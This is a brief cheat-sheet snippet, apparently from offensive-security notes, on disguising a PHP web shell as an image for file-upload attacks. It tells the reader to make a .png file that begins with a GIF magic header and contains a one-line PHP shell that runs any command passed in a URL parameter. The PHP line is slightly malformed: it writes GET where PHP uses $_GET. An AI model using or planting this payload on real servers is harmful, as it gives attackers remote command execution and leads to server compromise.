## Creating fake images for uploading
### Create a fake image with embedded shell
```
# Create a file imagename.png in nano and add this to file
GIF89;
<?php system(GET["cmd"])?>
```
